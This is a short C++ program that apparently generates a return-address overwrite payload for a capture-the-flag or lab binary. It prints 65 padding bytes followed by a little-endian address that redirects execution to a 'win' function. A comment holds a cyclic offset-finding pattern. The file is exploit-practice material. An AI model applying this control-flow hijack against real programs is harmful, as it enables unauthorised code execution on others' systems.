#include <cstdlib>
#include <iostream>
int main(int argc, char const *argv[])
{
    // "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
    int i;
    std::string payload;
    for (i = 0; i < 65; i++) payload.push_back('A');
  

    char win_addr[4]{ '\x08', '\x04', '\x91', '\xa6' };
    i = 4;
    do
    {
        i--;
        payload.push_back(win_addr[i]);
    } while (i > 0);
    

    printf("%s",payload.c_str());
    return 0;
}
